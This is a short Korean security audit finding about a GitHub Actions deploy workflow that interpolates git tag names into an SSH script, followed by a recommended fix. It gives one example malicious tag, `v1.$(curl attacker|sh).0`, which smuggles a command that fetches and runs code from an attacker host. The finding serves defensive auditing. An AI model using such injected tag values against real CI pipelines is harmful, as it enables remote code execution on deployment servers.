# deploy.yml tag 이름 스크립트 보간 (injection 패턴)

- **심각도**: 낮음 (보안 — tag push 권한자 한정이라 실효 낮음)
- **출처**: 2026-07-11 security-auditor 점검

## 문제

`IMAGE="${{ env.IMAGE }}"`가 SSH 스크립트에 문자열 치환으로 삽입됨. git tag 이름에 `$`, `(`, `)`가 허용되므로 `v1.$(curl attacker|sh).0` 같은 tag를 push할 수 있는 사람은 EC2에서 임의 명령 실행 가능. GitHub Actions의 대표적 injection 패턴.

- 위치: `.github/workflows/deploy.yml:88` (및 121-123)

## 수정 방향

appleboy/ssh-action의 `envs: IMAGE`로 환경변수 전달, 스크립트에서는 `"$IMAGE"`만 참조 (`${{ }}` 보간 제거).

## 프론트 영향

없음.
